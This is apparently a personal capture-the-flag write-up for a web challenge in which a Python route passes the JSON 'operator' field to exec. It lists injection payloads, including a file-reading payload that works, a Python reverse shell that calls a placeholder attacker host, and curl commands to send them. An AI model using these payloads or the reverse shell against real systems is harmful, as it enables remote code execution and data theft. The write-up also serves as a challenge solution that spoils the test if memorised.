# Web Challenge - Evaluation Deck

```sh
sudo docker build -t htb-web-1 .
sudo docker run -dp 1337:1337 htb-web-1
```

went to `$TARGET_IP:$TARGET_PORT`, clicked around. API request upon health update

```js
// static/js/ui.js

const calculate_health = (power, operator) => {
   fetch('/api/get_health',{
      method:'POST',
      headers: {
         'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 'current_health': health.toString(), 'attack_power': power, 'operator': operator })
   })
   // ...
}
```

```python
# blueprints/routes.py

# POST /api/get_health

code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)

# probably use this to spit back /flag.txt or copy /flag.txt to static directory?

# https://docs.python.org/3/library/functions.html#exec
# https://docs.python.org/3/library/functions.html#compile

# https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html
```

```json
// attempt 1
{
  "current_health": "100",
  "attack_power": "10",
  "operator": "+\"\"+open('/flag.txt','r')+\"\"+"
}
// probably not working because int + str



// check possible
{
  "current_health": "100",
  "attack_power": "10",
  "operator": "\nimport time\ntime.sleep(10)\nx="
}
// worked



// attempt 2
{
  "current_health": "100",
  "attack_power": "10",
  "operator": "\nimport shutil\nshutil.copyfile('/flag.txt','/app/challenge/application/static/flag.txt')\nx="
}
// idk why this wouldn't work...



// sanity check
{
  "current_health": "100",
  "attack_power": "10",
  "operator": ";result='hello world';x="
}
// worked



// maybe no permission, reverse shell ???
// https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
{
  "current_health": "100",
  "attack_power": "10",
  "operator": ";import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',9000));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());result='gotem';x="
}
// no probably not...



// im stupid; changed routes.py to return Exception and rebuilt docker container
// attempt 3
{
  "current_health": "100",
  "attack_power": "10",
  "operator": ";f=open('/flag.txt','r');result=f.readlines();x="
}
// worked
```

```sh
# try to exploit

# test good request; 100-10=90
curl -X POST -H "Content-Type: application/json" -d '{"current_health":"100","attack_power":"10","operator":"-"}' http://$TARGET_IP:$TAR
GET_PORT/api/get_health

# operator exploit; 100+10=110
curl -X POST -H "Content-Type: application/json" -d '{"current_health":"100","attack_power":"10","operator":"+"}' http://$TARGET_IP:$TARGET_PORT/api/get_health

# exploit with payload
curl -X POST -H "Content-Type: application/json" -d @payload.json http://$TARGET/api/get_health
```
